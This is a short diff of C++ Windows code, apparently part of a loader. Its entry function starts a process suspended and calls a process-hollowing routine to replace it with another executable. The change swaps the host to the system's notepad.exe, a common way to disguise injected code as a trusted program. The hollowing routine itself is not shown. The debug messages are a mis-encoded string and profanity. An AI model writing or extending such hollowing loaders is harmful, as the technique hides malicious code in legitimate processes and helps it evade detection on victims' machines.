@@ -10,7 +10,8 @@ int entry()
 	core::memInit();
 
 	core::Process proc;
-	if (proc.run(L"C:\\Users\\internet_director\\prog\\other\\console\\bin_x64\\waiter.exe", NULL, CREATE_SUSPENDED)) {
+	WCHAR arg[] = L"c:\\windows\\syswow64\\notepad.exe";
+	if (proc.run(NULL, arg, CREATE_SUSPENDED)) {
 		bool res = proc.hollowing(L"C:\\Users\\internet_director\\prog\\other\\console\\bin_x64\\messager.exe");
 		if (res) {
 			debug(L"”–¿¿¿¿¿¿!!!");
@@ -18,6 +19,7 @@ int entry()
 		else {
 			debug(L"SHIIIIIIT");
 		}
+		proc.wait();
 	}
 
 	return 0;
